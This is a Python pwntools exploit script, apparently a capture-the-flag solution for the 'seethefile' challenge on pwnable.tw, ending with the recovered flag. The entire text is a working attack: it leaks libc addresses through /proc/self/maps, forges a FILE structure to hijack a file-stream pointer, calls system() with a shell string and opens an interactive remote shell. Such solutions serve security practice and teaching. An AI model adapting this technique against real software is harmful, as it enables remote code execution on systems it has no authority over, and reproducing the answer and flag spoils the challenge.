from pwn import *


def p32(d):
    return d.to_bytes(4, "little")


elf = ELF("seethefile")
libc = ELF("libc_32.so.6")

r = remote("chall.pwnable.tw", port=10200)


def read(times):
    result = b""
    for _ in range(times):
        r.recvuntil("choice :")
        r.sendline("2")
        r.recvuntil("choice :")
        r.sendline("3")
        data = r.recvuntil("---------------MENU")
        result += data
    return result


r.recvuntil("choice :")
r.sendline("1")
r.recvuntil("see :")
r.sendline("/proc/self/maps")
procs = read(3).decode()
libc_leak = re.search("(f[a-z0-9]*)-f", procs).group(1)

libc_base = int(libc_leak, 16)
libc_sys = libc_base + libc.symbols["system"] + 0x1000
libc_nullp = libc_base + libc.symbols["_null_auth"]

name = 0x0804B260
after = 0x0804B284
jump_to = libc_sys

binsh = b"//bin/sh"

file_struct = b"B" * 10 + b"||sh||" + b"B" * (72 - 10 - 6) + p32(libc_nullp) + p32(name - 0x8) * 10
payload = p32(jump_to) + b"A" * 28 + p32(after) + file_struct

r.sendline("5")
r.sendline(payload)
r.recvuntil("time\n")
r.interactive()

# FLAG --> FLAG{F1l3_Str34m_is_4w3s0m3}
